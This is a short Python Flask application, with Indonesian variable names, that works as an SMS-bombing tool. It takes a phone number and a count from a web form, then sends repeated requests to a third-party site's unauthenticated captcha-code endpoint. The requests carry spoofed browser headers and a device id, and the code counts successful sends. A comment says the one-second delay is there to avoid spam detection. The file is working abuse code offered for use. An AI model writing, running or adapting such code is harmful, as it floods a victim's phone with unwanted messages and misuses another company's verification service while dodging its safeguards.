from flask import Flask, render_template, request, jsonify
import requests
import time

app = Flask(__name__, static_folder='templates/static', template_folder='templates')

def send_spam(nomor, jumlah):
    headers = {
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        'Accept': "application/json, text/plain, */*",
        'x-api-device-id': "bf4d6e7e1367cea9926e7d82a1a6b943",
        'Origin': "https://www.luckytimipro.com",
        'Referer': "https://www.luckytimipro.com/",
    }
    data = {'target': f"62{nomor}"}
    results = {'live': 0, 'gagal': 0}

    for _ in range(int(jumlah)):
        try:
            response = requests.post(
                "https://www.luckytimipro.com/api/user/sendCaptchCodeNoneLogin",
                data=data,
                headers=headers
            )
            if "请求成功！" in response.text:  # Periksa respons API
                results['live'] += 1
            else:
                results['gagal'] += 1
        except Exception as e:
            results['gagal'] += 1
        time.sleep(1)  # Delay untuk menghindari deteksi spam

    return results

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        nomor = request.form.get("nomor")
        jumlah = request.form.get("jumlah")
        results = send_spam(nomor, jumlah)
        return jsonify(results)
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True, port=5011)

